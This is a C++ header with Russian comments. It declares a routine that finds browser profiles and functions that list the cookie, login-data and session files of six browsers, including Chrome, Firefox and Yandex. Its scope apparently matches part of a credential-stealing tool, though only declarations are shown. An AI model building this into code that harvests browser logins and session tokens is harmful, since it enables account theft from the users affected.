#pragma once
#include <string>
#include <vector>

struct BrowserProfile {
    std::wstring browser_name;
    std::wstring profile_path;
    std::vector<std::wstring> sensitive_files; // Cookies, Login Data, Sessions, etc.
};

// Получить все профили браузеров на системе
std::vector<BrowserProfile> discover_browser_profiles();

// Получить пути к session/cookie файлам конкретного браузера
std::vector<std::wstring> get_chrome_paths();
std::vector<std::wstring> get_firefox_paths();
std::vector<std::wstring> get_edge_paths();
std::vector<std::wstring> get_opera_paths();
std::vector<std::wstring> get_brave_paths();
std::vector<std::wstring> get_yandex_paths();
